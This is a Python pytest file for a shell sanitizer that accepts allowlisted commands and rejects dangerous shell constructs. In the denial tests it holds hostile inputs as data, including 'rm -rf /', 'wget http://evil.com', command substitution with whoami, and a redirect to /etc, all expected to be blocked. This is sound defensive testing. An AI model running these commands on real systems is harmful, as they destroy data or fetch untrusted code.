from __future__ import annotations

import pytest

from restricted_exec.shell_sanitizer import (
    Plan,
    ShellDenied,
    Step,
    sanitize_shell_to_plan,
)


class TestShellAllowed:
    """Tests for constructs that SHOULD be allowed."""

    def test_simple_command(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, "echo hello")
        assert len(plan.steps) == 1
        assert plan.steps[0].command_id == "echo"
        assert plan.steps[0].args == {"value": "hello"}

    def test_command_with_flag(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, "mkdir --path mydir")
        assert plan.steps[0].command_id == "mkdir"
        assert plan.steps[0].args == {"path": "mydir"}

    def test_and_sequencing(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, "mkdir --path out && echo done")
        assert len(plan.steps) == 2
        assert plan.steps[0].command_id == "mkdir"
        assert plan.steps[1].command_id == "echo"

    def test_semicolon_sequencing(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, "echo a ; echo b")
        assert len(plan.steps) == 2

    def test_mixed_sequencing(self, basic_policy):
        plan = sanitize_shell_to_plan(
            basic_policy, "mkdir --path d && echo hello ; echo world"
        )
        assert len(plan.steps) == 3

    def test_pipeline(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, "echo hello | cat")
        assert len(plan.steps) == 2
        assert plan.steps[0].command_id == "echo"
        assert plan.steps[1].command_id == "cat"

    def test_redirect_stdout(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, "echo hello > out.txt")
        assert plan.steps[0].redirect.stdout_path == "out.txt"
        assert plan.steps[0].redirect.stdout_append is False

    def test_redirect_append(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, "echo hello >> out.txt")
        assert plan.steps[0].redirect.stdout_path == "out.txt"
        assert plan.steps[0].redirect.stdout_append is True

    def test_single_quoted_string(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, "echo 'hello world'")
        assert plan.steps[0].args == {"value": "hello world"}

    def test_double_quoted_string_literal(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, 'echo "hello world"')
        assert plan.steps[0].args == {"value": "hello world"}

    def test_plan_metadata(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, "echo hello")
        assert plan.policy_id == "test"
        assert plan.policy_version == "0.1"
        assert "input" in plan.explain

    def test_bare_value_arg(self, basic_policy):
        # echo has a single arg named "value" so bare args work
        plan = sanitize_shell_to_plan(basic_policy, "echo hello")
        assert plan.steps[0].args == {"value": "hello"}


class TestShellDenied:
    """Tests for constructs that MUST be denied."""

    def test_command_substitution_dollar_paren(self, basic_policy):
        with pytest.raises(ShellDenied, match="Forbidden token"):
            sanitize_shell_to_plan(basic_policy, "echo $(whoami)")

    def test_command_substitution_backticks(self, basic_policy):
        with pytest.raises(ShellDenied, match="Forbidden token"):
            sanitize_shell_to_plan(basic_policy, "echo `whoami`")

    def test_variable_expansion(self, basic_policy):
        with pytest.raises(ShellDenied):
            sanitize_shell_to_plan(basic_policy, "echo $HOME")

    def test_variable_expansion_braces(self, basic_policy):
        with pytest.raises(ShellDenied):
            sanitize_shell_to_plan(basic_policy, "echo ${HOME}")

    def test_globbing_star(self, basic_policy):
        with pytest.raises(ShellDenied, match="Forbidden token"):
            sanitize_shell_to_plan(basic_policy, "echo *")

    def test_globbing_question(self, basic_policy):
        with pytest.raises(ShellDenied, match="Forbidden token"):
            sanitize_shell_to_plan(basic_policy, "echo file?.txt")

    def test_process_substitution(self, basic_policy):
        with pytest.raises(ShellDenied, match="Forbidden token"):
            sanitize_shell_to_plan(basic_policy, "cat <(echo hello)")

    def test_command_not_allowlisted(self, basic_policy):
        with pytest.raises(ShellDenied, match="not allowlisted"):
            sanitize_shell_to_plan(basic_policy, "rm -rf /")

    def test_unknown_command(self, basic_policy):
        with pytest.raises(ShellDenied, match="not allowlisted"):
            sanitize_shell_to_plan(basic_policy, "wget http://evil.com")

    def test_or_operator_denied(self, basic_policy):
        with pytest.raises(ShellDenied, match="Unsupported list operator"):
            sanitize_shell_to_plan(basic_policy, "echo a || echo b")

    def test_backgrounding(self, basic_policy):
        with pytest.raises(ShellDenied):
            sanitize_shell_to_plan(basic_policy, "echo hello &")

    def test_unknown_flag(self, basic_policy):
        with pytest.raises(ShellDenied, match="Unknown flag"):
            sanitize_shell_to_plan(basic_policy, "echo --nonexistent foo")

    def test_redirect_escapes_workspace(self, basic_policy):
        with pytest.raises(Exception):
            sanitize_shell_to_plan(basic_policy, "echo hello > /etc/evil.txt")

    def test_redirect_stdin_denied(self, basic_policy):
        with pytest.raises(ShellDenied):
            sanitize_shell_to_plan(basic_policy, "cat < input.txt")

    def test_empty_input(self, basic_policy):
        with pytest.raises(ShellDenied):
            sanitize_shell_to_plan(basic_policy, "")

    def test_too_many_steps(self, basic_policy):
        # max_pipeline_steps is 8
        cmd = " | ".join(["echo hello"] * 10)
        with pytest.raises(ShellDenied, match="Too many steps"):
            sanitize_shell_to_plan(basic_policy, cmd)

    def test_subshell_parentheses(self, basic_policy):
        with pytest.raises(ShellDenied):
            sanitize_shell_to_plan(basic_policy, "(echo hello)")

    def test_brace_group(self, basic_policy):
        with pytest.raises(ShellDenied):
            sanitize_shell_to_plan(basic_policy, "{ echo hello; }")

    def test_for_loop(self, basic_policy):
        with pytest.raises(ShellDenied):
            sanitize_shell_to_plan(basic_policy, "for i in a b c; do echo $i; done")

    def test_if_statement(self, basic_policy):
        with pytest.raises(ShellDenied):
            sanitize_shell_to_plan(basic_policy, "if true; then echo yes; fi")

    def test_while_loop(self, basic_policy):
        with pytest.raises(ShellDenied):
            sanitize_shell_to_plan(basic_policy, "while true; do echo loop; done")

    def test_function_definition(self, basic_policy):
        with pytest.raises(ShellDenied):
            sanitize_shell_to_plan(basic_policy, "foo() { echo bar; }")

    def test_bare_arg_when_multiple_args(self, basic_policy):
        # mkdir has arg named "path" not "value", and it's the only arg
        # but bare args only work when there's a single arg named "value"
        with pytest.raises(ShellDenied, match="Bare arg not allowed"):
            sanitize_shell_to_plan(basic_policy, "mkdir mydir")

    def test_missing_flag_value(self, basic_policy):
        with pytest.raises(ShellDenied, match="Missing value"):
            sanitize_shell_to_plan(basic_policy, "mkdir --path")


class TestShellEdgeCases:
    def test_max_steps_exactly(self, basic_policy):
        cmd = " | ".join(["echo hello"] * 8)
        plan = sanitize_shell_to_plan(basic_policy, cmd)
        assert len(plan.steps) == 8

    def test_whitespace_handling(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, "   echo    hello   ")
        assert plan.steps[0].args == {"value": "hello"}

    def test_redirect_to_subdirectory(self, basic_policy):
        plan = sanitize_shell_to_plan(basic_policy, "echo hello > subdir/out.txt")
        assert plan.steps[0].redirect.stdout_path == "subdir/out.txt"
